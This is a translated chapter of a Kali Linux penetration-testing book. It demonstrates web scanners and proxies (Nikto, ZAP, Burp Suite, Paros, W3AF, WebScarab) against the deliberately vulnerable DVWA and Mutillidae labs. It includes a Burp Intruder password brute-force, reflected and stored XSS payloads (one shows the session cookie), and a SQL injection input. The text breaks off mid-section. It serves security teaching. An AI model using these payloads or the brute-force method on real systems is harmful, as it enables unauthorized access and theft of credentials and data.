在第六章中，*漏洞扫描*，我们看了使用 Nessus 和 OpenVAS 进行漏洞扫描，这两个都是非常强大的工具。在本章中，我们将专门研究用于 Web 和 Web 应用程序扫描和攻击的工具。

如今开发的大多数应用程序集成了不同的 Web 技术。这增加了暴露敏感数据的复杂性和风险。Web 应用程序一直是恶意对手窃取、操纵、破坏和勒索企业业务的长期目标。Web 应用程序的大量增加给渗透测试人员带来了巨大的挑战。关键在于保护 Web 应用程序的前端，其后端通常包括数据库、任何额外的微服务和整体网络安全。这是必要的，因为 Web 应用程序充当数据处理系统，数据库负责存储敏感数据（例如信用卡、客户详细信息和身份验证数据）。

本章将介绍的工具包括 Web 应用程序侦察和漏洞扫描程序、代理、数据库攻击类型、Web 攻击工具以及一些客户端/浏览器攻击工具。

# 技术要求

本章需要以下内容：

+   Kali Linux

+   **OWASP Broken Web Applications** (**BWA**)

OWASP BWA 是来自 OWASP 的预配置虚拟机，其中包含一些易受攻击的 Web 应用程序。我们将使用 VM 上的一个应用程序，即**Damn Vulnerable Web App** (**DVWA**)。

# Web 分析

在本节中，我们将介绍用于识别 Web 应用程序可能漏洞的工具。其中一些工具，特别是 Burp Suite 和 OWASP ZAP，不仅可以对 Web 和云应用程序执行漏洞评估，还可以攻击这些漏洞，并且您将在本章后面看到它们的出现。

根据我们从各种工具的结果中收集的信息，我们将能够确定我们的攻击向量，试图通过密码攻击或从数据库或系统本身中窃取数据来访问系统。

# Nikto

Nikto 是一个基本的 Web 服务器安全扫描程序。它扫描并检测 Web 应用程序上通常由服务器配置错误、默认和不安全文件以及过时的服务器应用程序引起的漏洞。由于 Nikto 纯粹基于 LibWhisker2 构建，因此它支持跨平台部署、SSL、主机身份验证方法（NTLM/基本）、代理和几种 IDS 逃避技术。它还支持子域枚举、应用程序安全检查（XSS、SQL 注入等），并且能够使用基于字典的密码攻击来猜测授权凭据。

要使用`nikto`，您可以转到应用程序菜单| 03-Web 应用程序分析| Web 漏洞扫描程序| nikto，或者在终端中简单地输入以下内容：

```
# nikto
```

要找到 Nikto，可以轻松地转到应用程序|漏洞分析|nikto。

默认情况下，就像之前在其他应用程序中看到的那样，只需运行命令即可显示我们可用的不同选项。要扫描目标，请输入`nikto -h <target> -p <port>`，其中`<target>`是目标网站的域名或 IP 地址，`<port>`是服务运行的端口。对于这次扫描，`nikto`将针对一个名为 OSWAP BWA 的本地 VM 进行扫描（可在[`sourceforge.net/projects/owaspbwa/files/`](https://sourceforge.net/projects/owaspbwa/files/)找到）。OWASP BWA 是一个基于 VMware 的虚拟机中的故意易受攻击的 Web 应用程序集合：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4401d8d5-6695-46f9-b4bd-56b535d2d504.jpg)

在屏幕截图中阅读结果片段时，在前几行中，`nikto`告诉我们目标的 IP 地址和主机名。在基本目标信息之后，`nikto`显示了正在运行的 Web 服务器及其版本，例如 Ubuntu 系统上的 Apache 2.2.14，并加载了一些模块，例如`mod_perl/2.0.4`和`OpenSSL/0.9.8k`。继续向下看，我们看到了一些有用的信息，例如 CGI 文件夹的路径(`/cgi-bin/`)，以及一些加载的模块已经过时：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/98aa5ffd-fddf-460b-b1a9-4159f36b5e47.jpg)

在结果的更下方，`nikto`显示了 OSVDB 代码。OSVDB 是开放式漏洞数据库的缩写。这是安全行业专业人士于 2004 年正式启动的一个倡议，是一个存储安全漏洞的技术信息的数据库（其中绝大多数是与 Web 应用程序相关的）。不幸的是，由于缺乏支持和贡献，该服务于 2016 年 4 月关闭，但是，[`cve.mitre.org`](http://cve.mitre.org)团队已经编制了一个参考地图，将 OSVDB 与 CVE 条目联系起来（[`cve.mitre.org/data/refs/refmap/source-OSVDB.html`](http://cve.mitre.org/data/refs/refmap/source-OSVDB.html)）。

这可以用来获取`nikto`提供的 OSVDB 代码的更多详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/87281aa4-a850-4ff6-8a16-938ce0c7320c.jpg)

Nikto 具有识别 Web 应用程序漏洞的功能，例如信息泄露、注入（XSS/Script/HTML）、远程文件检索（服务器范围内）、命令执行和软件识别。除了基本扫描外，Nikto 允许渗透测试人员定制其特定目标的扫描。以下是一些可用于扫描的选项：

+   使用`-T`命令行开关和单独的测试编号，可以将测试定制为特定类型

+   通过使用`–t`，您可以为每个测试响应设置超时值

+   `-D V`控制显示输出

+   `-o`和`-F`定义了要以特定格式编写的扫描报告

+   还有其他高级选项，例如`–mutate`（猜测子域、文件、目录和用户名）、`-evasion`（绕过 IDS 过滤器）和`-Single`（用于单个测试模式），您可以使用这些选项深入评估您的目标

# OWASP ZAP

**OWASP Zed Attack Proxy**（**ZAP**）是一个 Web 应用程序漏洞扫描器。由 OWASP 项目创建，这是一个基于 Java 的开源扫描器，具有很多功能。它包括 Web 爬虫、漏洞识别和模糊分析，并且可以作为 Web 代理。要启动 ZAP，转到应用程序|Web 应用程序分析|owasp-zap，或在终端中输入：

```
# owasp-zap
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/71e97514-84d9-4bcf-94c0-aed7c744a4f0.jpg)

加载后，很容易开始扫描目标站点。在 ZAP 的主屏幕上，有一个字段用于输入目标的地址。这次，目标是 BWA 虚拟机上易受攻击的 Web 应用程序之一，DVWA。输入目标后，单击“Attack”按钮，观察 ZAP 的工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/313b3bfa-343c-4254-9121-6ccdfdb10b43.jpg)

扫描结果出现在主屏幕底部。ZAP 扫描站点时的第一步是识别或爬行整个站点，跟随与主机相关的链接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/894b06db-1646-4a85-8ee5-85681d03bbe1.jpg)

在爬行网站之后，ZAP 对常见的 Web 应用程序漏洞进行了多种不同的检查。这些漏洞在左下角的警报选项卡下显示。例如，以下是 ZAP 在 DVWA 应用程序上识别的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ff9e27d1-3cb4-4a63-a676-ce663c9497c6.jpg)

然后，您可以深入研究特定站点路径，以确定这些漏洞确切出现的位置；在这种情况下，我们看到`login.php`容易受到 SQL 注入的攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b82cf09a-af57-475c-ae2a-e0ade2de65f1.jpg)

扫描只是 ZAP 提供的所有工具的表面。有关 ZAP 的更多信息，OWASP 的资源位于[`www.owasp.org/index.php/ZAP`](https://www.owasp.org/index.php/ZAP)。

# Burp Suite

Burp Suite 是强大的 Web 应用程序安全工具的组合。这些工具展示了攻击者渗透 Web 应用程序的真实能力。它们可以使用手动和自动技术扫描、分析和利用 Web 应用程序。这些工具之间的接口集成设施提供了一个完整的攻击平台，可以在一个或多个工具之间共享信息。这使得 Burp Suite 成为一个非常有效和易于使用的 Web 应用程序攻击框架。

要启动 Burp Suite，请导航到应用程序|Web 应用程序分析|burpsuite 或使用终端执行以下命令：

```
# burpsuite
```

当首次启动 Burp 时，您将被要求接受条款和条件，并设置您的项目环境（现在保持默认设置就足够了）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/deadaeb5-fd90-4dc5-89bb-039702b87c09.jpg)

您将在屏幕上看到一个 Burp Suite 窗口。所有集成工具（目标、代理、蜘蛛、扫描器、入侵者、重复者、顺序器、解码器和比较器）都可以通过它们各自的选项卡访问。您可以通过帮助菜单或访问[`www.portswigger.net/burp/help/`](http://www.portswigger.net/burp/help/)获取有关它们的使用和配置的更多详细信息。请注意，Burp Suite 有三个不同的版本：**免费（社区）**、专业版和企业版。Kali 中提供的是免费社区版。

如前所述，Burp Suite 自带其自己的 Spider。应用程序感知蜘蛛，或 burpspider，是一个网络爬虫，本质上是一个系统地浏览目标站点及其所有内部页面并映射其结构的机器人。

在我们的示例中，我们将使用 Burp 来破解登录凭据以访问 DVWA 应用程序。首先，我们需要设置代理，并验证 IP 是否设置为本地主机 IP，端口应为`8080`。转到代理选项卡，然后转到选项子选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/500cfbaf-39f8-4531-b1fc-429fc5fdae33.jpg)

还要验证代理选项在代理选项卡下是否打开，然后检查是否打开拦截选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/78a997ee-8fc4-4016-964d-ab11dfc64b0d.jpg)

完成后，打开浏览器，转到选项|首选项|高级|网络|连接设置。

现在，您需要将浏览器设置为代理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/fb5bfd99-ef09-473d-98b9-5659485d304e.jpg)

这就是我们的初始设置。现在，我们需要访问目标站点，即`192.168.0.32/dvwa`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/baed0a38-4877-4f90-ab62-fe196228c75c.jpg)

输入地址后，它应该保持在连接循环中。但是，如果您查看 Burp Suite 界面，您可以看到一些数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/57d34d84-fafe-40d5-be39-4428f087ac79.jpg)

点击几次“前进”后，浏览器应该加载到网页。

在 Burp Suite 中，在目标选项卡下，现在在站点地图选项卡中有一些数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ffe3b02e-aa62-42dd-8b87-d02c6371503d.jpg)

然后，只需右键单击主机并选择从此处蜘蛛或从主机蜘蛛。

现在，在某个地方，您应该会收到一个弹出窗口，指示 burpspider 发现了一个请求一些信息的表单。当 burpspider 发现表单时，它总是会弹出。请记住，表单可以请求用户凭据，也可以是一个简单的搜索/查询/查找表单。

说到这一点，在我们的情况下，这是一个登录表单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a0bb27ac-f263-4dcc-946c-07d7ba2d49a1.jpg)

回到目标站点上的页面，通过在页面上的登录表单中输入一些随机凭据，为 Burp Suite 的入侵者工具生成一些流量。

输入凭据后，查看我们的拦截器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a6502260-533e-414e-a79e-64c5eafd4fc9.jpg)

注意我们得到的关键信息，用户名和密码，并在网页上验证它如何告诉我们我们输入的凭据是错误的。在这种情况下，它告诉我们`登录`失败了，是一个简单的字符串消息，然而，有时可能会是一个弹出窗口或一个 cookie。

现在，右键单击目标，选择发送到 Intruder。

在 Intruder 选项卡下，选择 Positions 选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3ff47182-3ac5-4e01-b239-acc188de7372.jpg)

用户名和密码是我们输入的用户名和密码。请注意，默认情况下，可能会突出显示更多字段或位置。要清除这些字段，只需单击我们不想要的字段，然后单击右侧的清除按钮。这些字段或位置是 Intruder 将用我们定义的负载替换的地方，本例中是用户名和密码。

在继续之前，请验证攻击类型是否设置为 Cluster bomb。现在，转到 Payloads 选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/e6077949-ce94-45ef-9d32-fb0966c9eac5.jpg)

当您点击负载集下拉菜单时，其中的计数应反映在位置选项卡中的位置数。

现在，选择 1，这将对应用户名字段，并将负载类型设置为 Simple list。在 Payload Sets 部分的 Payload Options 部分中，输入用户名在标有“输入新项目”的文本字段中，然后点击添加。这将被 Intruder 用作用户名。您可以添加多个用户名。

目前，我只会输入`admin`用户名进行测试：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/736cd79a-37b5-4466-8eb4-74c662418ba4.jpg)

现在，让我们设置负载集 2，即密码字段。不要逐个输入密码，点击加载按钮，加载你的密码文件之一（`rockyou.txt`位于 Kali 的`/usr/share/wordlist`中）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/16ce6bca-de95-4800-a252-50fc65fef984.jpg)

一切设置好后，点击开始攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d3de747d-c506-46fb-8876-c5dd852c0029.jpg)

这个截图显示了结果弹出窗口。查看结果，所有尝试都得到了`302`的状态（HTTP 响应代码）。快速搜索 HTTP 响应代码表明这会导致重定向，但重定向到哪里呢？

如果我们点击每个结果，然后选择响应选项卡，你会看到唯一重定向到`index.php`的结果是`admin:password`。现在我们可以转到 DVWA 登录页面，输入凭据，获得对该站点的访问权限。

我们还可以通过 Burp Suite 中的另一个工具 Repeater 来验证这一点。Repeater 用于手动修改 HTTP 请求和请求中发送的数据。

回到目标选项卡，选择`login.php`的`POST`请求。这是发送用户名和密码的表单请求。右键单击它，选择发送到 Repeater。

现在，选择 Repeater 选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/8909c91a-5ac7-4917-868f-453a9b07042e.jpg)

在`password=`之后，删除错误的密码，输入将我们重定向到`index.php`的密码。在这种情况下，密码是`password`。完成后，点击 Go：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c08a5aa8-f955-4454-aeae-020e3c90b1e8.jpg)

在响应面板中，我们看到 Location:`index.php`。现在，点击顶部的`跟随重定向`按钮。这会产生原始 HTML，以及在渲染选项卡下的渲染，显示页面应该是什么样子的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0c221a0c-1994-42de-83b5-f892d27729de.jpg)

在这个例子中，我们使用了 Burp Suite 提供的一些常用工具。作为一款集成了所有功能的应用安全工具包，Burp Suite 是一个非常全面和强大的 Web 应用程序攻击平台。

解释每个部分超出了本书的范围；因此，我们强烈建议您访问该网站（[`www.portswigger.net`](http://www.portswigger.net)）以获取更详细的示例。

# Paros 代理

Paros 代理是一个有价值且强大的漏洞评估工具。它可以爬行整个网站并执行各种漏洞测试。它还允许审计员通过在浏览器和实际目标应用程序之间设置本地代理来拦截 Web 流量（HTTP/HTTPS）。这种机制帮助审计员干扰或操纵发送到目标应用程序的特定请求，以便手动测试。因此，Paros 代理充当主动和被动的 Web 应用程序安全评估工具。要启动 Paros 代理，请导航到应用程序 | Web 应用程序分析 | paros 或在终端中输入以下命令：

```
# paros
```

这将打开 Paros 代理窗口。在进行任何实际练习之前，您需要在您喜欢的浏览器中设置本地代理（`127.0.0.1, 8080`）。如果您需要更改任何默认设置，请导航到菜单栏中的工具 | 选项。这将允许您修改连接设置、本地代理值、HTTP 身份验证和其他相关信息。设置好您的浏览器后，访问您的目标网站。

以下是漏洞测试和获取其报告的步骤：

1.  在我们的案例中，我们浏览`http://192.168.0.30/mutillidae`并注意到它出现在 Paros 代理的站点选项卡下。

1.  右键单击`http://192.168.0.30/mutillidae`并选择 Spider 以爬行整个网站。这将需要几分钟，具体取决于您的网站大小。

1.  网站爬行完成后，您可以在底部的 Spider 选项卡中看到所有发现的页面。此外，您可以通过在站点选项卡的左侧面板上选择目标网站，并选择特定页面来追踪所需页面的特定请求和响应。

1.  为了捕获任何进一步的请求和响应，请转到右侧面板上的 Trap 选项卡。当您决定对目标应用程序进行一些手动测试时，这是特别有用的。此外，您可以通过导航到工具 | 手动请求编辑器来构建自己的 HTTP 请求。

1.  要执行自动化的漏洞测试，我们在站点选项卡下选择目标网站，并导航到分析 | 从菜单中的所有扫描。请注意，您仍然可以通过导航到分析 | 扫描策略，然后导航到分析 | 扫描而不是扫描所有来选择特定类型的安全测试。

1.  漏洞测试完成后，您可以在底部的警报选项卡上看到一些安全警报。这些被分类为高、低和中风险级别。

1.  如果您想要扫描报告，请在菜单栏中导航到报告 | 最新扫描报告。这将生成一个报告，列出测试会话期间发现的所有漏洞(`/root/paros/session/LatestScannedReport.html`)。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/edc4ac8f-5744-4a3c-8e2d-9de0529c6379.png)

我们使用了基本的漏洞评估测试来进行示例场景。

为了更熟悉 Paros 代理提供的各种选项，我们建议您阅读用户指南，网址为：[`www.ipi.com/Training/SecTesting/paros_user_guide.pdf`](http://www.ipi.com/Training/SecTesting/paros_user_guide.pdf)。

# W3AF

W3AF 是一个功能丰富的 Web 应用程序攻击和审计框架，旨在检测和利用 Web 漏洞。整个应用程序安全评估过程是自动化的，该框架旨在遵循三个主要步骤：发现、审计和攻击。每个步骤都包括几个插件，可以帮助审计员专注于特定的测试标准。所有这些插件都可以通信并共享测试数据，以实现所需的目标。它支持检测和利用多个 Web 应用程序漏洞，包括 SQL 注入、跨站脚本、远程和本地文件包含、缓冲区溢出、XPath 注入、操作系统命令和应用程序配置错误。

要获取有关每个可用插件的更多信息，请转到[`w3af.sourceforge.net/plugin-descriptions.php`](http://w3af.sourceforge.net/plugin-descriptions.php)。

要启动 W3AF，请转到应用程序 | Web 漏洞分析 | w3af，或者在终端中输入以下内容：

```
# w3af_console
```

这将使您进入个性化的 W3AF 控制台模式（`w3af>>>`）。请注意，该工具的 GUI 版本也可在相同菜单的位置找到，但我们选择向您介绍控制台版本，因为它具有灵活性和可定制性：

```
w3af>>> help
```

这将显示可用于配置测试的所有基本选项。每当您需要任何特定选项的帮助时，都可以使用帮助命令。在我们的练习中，我们将配置输出插件，启用所选的审计测试，设置目标，并对目标网站执行扫描过程，使用以下命令：

+   `w3af>>> 插件`

+   `w3af/plugins>>> 帮助`

+   `w3af/plugins>>> 输出`

+   `w3af/plugins>>> 输出控制台，html 文件`

+   `w3af/plugins>>> 输出配置 html 文件`

+   `w3af/plugins/output/config:html_file>>> 帮助`

+   `w3af/plugins/output/config:html_file>>> 查看`

+   `w3af/plugins/output/config:html_file>>> 设置详细 True`

+   `w3af/plugins/output/config:html_file>>> 设置输出文件 metasploitable.html`

+   `w3af/plugins/output/config:html_file>>> 返回`

+   `w3af/plugins>>> 输出配置控制台`

+   `w3af/plugins/output/config:console>>> 帮助`

+   `w3af/plugins/output/config:console>>> 查看`

+   `w3af/plugins/output/config:console>>> 设置详细 False`

+   `w3af/plugins/output/config:console>>> 返回`

+   `w3af/plugins>>> 审计`

+   `w3af/plugins>>> 审计 htaccess_methods, os_commanding, sqli, xss`

+   `w3af/plugins>>> 返回`

+   `w3af>>> 目标`

+   `w3af/config:target>>> 帮助`

+   `w3af/config:target>>> 查看`

+   `w3af/config:target>>> 设置目标 http://http://192.168.0.30/mutillidae/index.php?page=login.php`

+   `w3af/config:target>>> 返回`

+   `w3af>>>`

此时，我们已经配置了所有必需的测试参数。我们将使用以下命令对目标进行 SQL 注入、跨站脚本、OS 命令执行和 htaccess 配置错误进行评估：

```
w3af>>> start
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5c207d32-7caa-41bc-aac2-8b89828588e3.png)

正如您所看到的，我们已经发现了目标 Web 应用程序中的跨站脚本漏洞。还创建了一个详细的 HTML 报告，并发送到`root`文件夹。该报告详细说明了所有的漏洞，包括关于每个请求和 W3AF 与目标 Web 应用程序之间传输的响应数据的调试信息。

我们在前面的代码中呈现的测试案例并未反映出其他有用插件、配置文件和利用选项的使用。因此，我们强烈建议您浏览用户指南中提供的各种练习。这些可以在[`w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf`](http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf)找到。

# WebScarab

WebScarab 是一个强大的 Web 应用程序安全评估工具。它有几种操作模式，但主要通过拦截代理进行操作。该代理位于最终用户的浏览器和目标 Web 应用程序之间，以监视和修改在两侧传输的请求和响应。这个过程帮助审计人员手动制作恶意请求并观察 Web 应用程序返回的响应。它具有许多集成工具，如模糊器、会话 ID 分析、蜘蛛、Web 服务分析器、XSS 和 CRLF 漏洞扫描器以及转码器。

要启动 WebScarab lite，请转到应用程序 | Web 应用程序分析 | webscarab，或者在终端中输入以下内容：

```
# webscarab
```

这将弹出 WebScarab 的精简版。对于我们的练习，我们将通过导航到菜单栏中的 Tools | Use full-featured interface 来将其转换为完整功能版。这将确认选择，并且你应该相应地重新启动应用程序。一旦你重新启动 WebScarab 应用程序，你将在屏幕上看到一些工具选项卡。在开始练习之前，我们需要将浏览器配置到本地代理（`127.0.0.1, 8008`），以便通过 WebScarab 拦截代理浏览目标应用程序。如果你想更改本地代理（IP 地址或端口），请导航到 Proxy | Listeners 选项卡。以下步骤将帮助你分析目标应用程序的会话 ID：

+   一旦本地代理设置好，你应该浏览到目标网站（例如，`http://192.168.0.30/mutillidae`），并访问尽可能多的链接。这将增加捕获任何已知和未知漏洞的概率。或者，你可以在摘要选项卡下选择目标，右键单击，然后选择 Spider tree。这将获取目标应用程序中的所有可用链接。

+   如果你想检查摘要选项卡底部提到的特定页面的请求和响应数据，双击它，你可以看到表格和原始格式中的解析请求。然而，响应也可以以 HTML、XML、文本和十六进制格式查看。

+   在测试期间，我们可能决定对我们的目标应用程序链接之一进行模糊处理，该链接具有参数（例如，`artist=1`），使用`GET`方法。如果存在未知的漏洞，这可能会揭示出来。右键单击所选链接，选择“Use as fuzz template”。现在，单击 Fuzzer 选项卡，并通过单击 Parameters 部分附近的 Add 按钮手动应用不同的值到参数。在我们的情况下，我们编写了一个列出已知 SQL 注入数据的小文本文件（例如，`1 AND 1=2`，`1 AND 1=1`，和单引号`(')`），并将其作为模糊参数值的来源。这可以通过 Fuzzer 选项卡下的 Sources 按钮来完成。一旦你的模糊数据准备好了，点击开始。在所有测试完成后，你可以双击单个请求并检查其响应。在我们的一个测试案例中，我们发现了一个 MySQL 注入漏洞：

+   **错误**：你的 SQL 语法有错误；请检查与你的 MySQL 服务器版本相对应的手册，以了解在第`1`行附近使用的正确语法。

+   **警告**：`mysql_fetch_array()`: supplied argument is not a valid MySQL result resource in `/var/www/vhosts/default/htdocs/ listproducts.php` on line `74`

+   在我们的最后一个测试案例中，我们决定分析目标应用程序的会话 ID。为此，请转到`SessionID`分析选项卡，并从组合框中选择“Previous Requests”。一旦选择的请求加载完成，转到底部，选择样本（例如，`20`），然后单击 Fetch 以检索各种会话 ID 的样本。之后，单击“测试”按钮开始分析过程。你可以在分析选项卡上看到结果，并在可视化选项卡上看到图形表示。这个过程确定了会话 ID 的随机性和不可预测性，这可能导致劫持其他用户的会话或凭据。

这个工具有各种选项和功能，可能会为渗透测试增加认知价值。要获取有关 WebScarab 项目的更多信息，请访问[`www.owasp.org/index.php/Category:OWASP_WebScarab_Project`](http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)。

# 跨站脚本

**跨站脚本**（**XSS**）攻击今天仍然非常普遍。这是一种注入攻击类型，攻击者向 Web 应用程序发送的请求中注入恶意脚本或代码。这些攻击成功是因为用户输入在发送到服务器之前没有得到正确的验证。

最初有两种 XSS，但在 2005 年，发现了第三种：

+   **存储 XSS：**存储 XSS 发生在用户输入被存储在目标服务器上并且没有被验证的情况下。存储可以是数据库、论坛或评论字段。受害者在不知情的情况下从 Web 应用程序中检索存储的数据，因为浏览器认为由于客户端和服务器之间的固有信任，这些数据是安全的。由于输入实际上被存储，存储 XSS 被认为是持久性或永久性的。

+   **反射 XSS：**反射 XSS 发生在用户输入立即由 Web 应用程序返回，以错误消息、搜索结果或任何其他响应的形式返回，其中包括用户提供的请求的一部分或全部输入，而这些数据在浏览器中没有被安全地呈现，并且没有永久存储用户提供的数据。

+   DOM XSS：**文档对象模型**（**DOM**）是 HTML 和 XML 文档的编程 API。它定义了文档的逻辑结构以及文档的访问和操作方式。DOM 型 XSS 是一种 XSS 形式，其中从源到汇的整个污染数据流都在浏览器中进行，也就是说，数据的源在 DOM 中，汇也在 DOM 中，数据流永远不会离开浏览器。

# 测试 XSS

为了测试 XSS 漏洞，我们将使用 JavaScript 和标准 HTML：

+   **测试反射 XSS**

记住我们之前说过的：反射 XSS 之所以被命名，是因为用户输入立即被 Web 应用程序处理并返回。要测试它，我们需要找到一个接受用户输入的字段。

让我们登录到之前破解密码的 DVWA 页面。在主页上，左侧将有一个菜单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ad32e445-d743-411b-a2b3-96b8e3dec20f.jpg)

选择 DVWA 安全，然后在下拉框中选择低，然后单击提交。通过这样做，我们已经设置了 Web 应用程序，使其操作就好像输入没有被验证一样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/88e197b2-2f66-48e2-b358-e395caf986e4.jpg)

对于我们的第一个测试，导航到页面上反射 XSS 显示在左侧菜单中。在输入字段中，输入以下 JavaScript：

```
<script>alert(“Allows XSS”)</script>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a46d1be3-8682-4f93-8c01-43272eaef9ec.jpg)

单击提交。

如果成功，您应该看到一个带有“允许 XSS”消息的弹出消息框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/aa2300bf-9929-42bf-98fb-7538ad7fe838.jpg)

让我们再试一次。输入以下内容：

```
<script>window.location=’https://www.google.com’</script>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c27042ef-9252-49be-a00a-65ed7b3c4e94.jpg)

这将把浏览器重定向到不同的网站，在我们的例子中是[google.com](https://www.google.com/?gws_rd=ssl)。

+   **测试存储 XSS**

存储 XSS 之所以被命名，是因为它将自身存储在一个位置，尽管是数据库，并且每当用户访问受影响的站点时，代码都会执行。攻击者可以轻松地将关键信息，如 cookie，发送到远程位置。要测试它，我们需要找到一个接受用户输入的字段，例如评论字段。

让我们导航到左侧菜单中存储 XSS 的页面。我们看到两个输入字段：名称和消息。这模拟了许多网站上找到的基本评论或反馈表单。在名称字段中，输入任何您喜欢的名称，但在消息字段中输入以下代码，然后单击“签名留言簿”：

```
<script>alert(document.cookie)</script>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/bf3fa090-98cd-494c-ad9c-b1f933ea6971.jpg)

这是我们得到的弹出窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/aa79f930-1705-4457-9a63-ba75275b73f1.jpg)

现在，如果我们离开这个页面，比如到主页，然后返回到 XSS 存储页面，我们的代码应该再次运行并显示一个带有当前会话 cookie 的弹出窗口。这可以大大扩展，并且通过更多 JavaScript 的了解，攻击者可以造成很大的破坏。

# SQL 注入

SQL 注入，或 SQLi，是对 SQL 数据库的攻击，其中通过来自客户端到应用程序的某种输入插入了代码或数据库查询。SQLi 是最古老的漏洞之一，但仍然是最常见的漏洞之一，因为基于 SQL 的数据库是如此普遍，所以也是最危险的漏洞之一。

SQL 注入攻击的严重程度受到攻击者的技能和想象力的限制，以及防御深度对策的影响，例如对数据库服务器的低特权连接。一般来说，将 SQL 注入视为高影响严重性。

在我们注入 SQL 之前，我们应该对 SQL 有一个基本的了解，并且了解数据库结构。

SQL 被认为是第四代编程语言，因为它使用标准的人类可理解的单词作为其语法：只是英语和括号。 SQL 用于数据库，我们可以使用它来创建表；添加记录，删除和更新，为用户设置权限；等等。

这是一个创建表的基本查询：

```
create table employee 
(first varchar(15),
last varchar(20),
age number(3),
address varchar(30),
city varchar(20),
state varchar(20));
```

前面的代码表示创建一个名为`employee`的表，具有以下列，`first`，`last`，`age`，`address`和`city`，然后分配它们的数据类型为`varchar(15)`字符限制[可变字符，最多 15 个字符]，和 number(3) [仅数字，最多 3 个数字，因此为 999]。

这是一个基本查询（也称为`select`语句）来从表中检索数据：

```
select first, last, city from employee
```

`select`语句是我们将利用的查询。

当您登录网站时，它会向数据库发送一个选择查询/语句，以检索数据以确认您登录的数据。

假设登录页面如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0ea426a2-6048-413d-a465-163d3eec76ac.jpg)

在登录时的后端查询可能如下所示：

```
SELECT * from users WHERE username=’username’ and password=’password’
```

前面的语句表示从名为 users 的表中选择所有（`*`），其中列`username=`是变量用户名（登录字段），列`password =`是变量密码（密码字段）。

# 手动 SQL 注入

现在我们了解了 SQL 查询的基础知识，让我们利用这一点。再次使用 DVWA，登录到 DVWA 并转到 SQL 注入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/14c10021-743c-416a-bf0b-4300034cf931.jpg)

我们可以看到这个页面有一个字段，供用户输入某人的用户 ID。如果我们在这里输入`1`，应用程序应该告诉我们谁有用户 ID 1。

让我们对 SQL 注入进行一个简单的测试。在用户 ID 字段中，不要输入数字，输入以下内容：

`%’ or ‘1’=’1`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b219451f-4172-4fee-adcf-67a087ce569a.jpg)

让我们假设初始查询如下所示：

```
SELECT user_id, first_name, fast_name From users_table Where user_id = 'UserID';
```

我们假设表名为`users_table`，具有相关的列名。我们所做的是将前面的语句更改为以下内容：

```
'SELECT user_id, first_name, last_name FROM users WHERE user_id = %' OR '1'='1';
```

然后点击提交。我们的结果应该是表中的所有数据，如下所示：

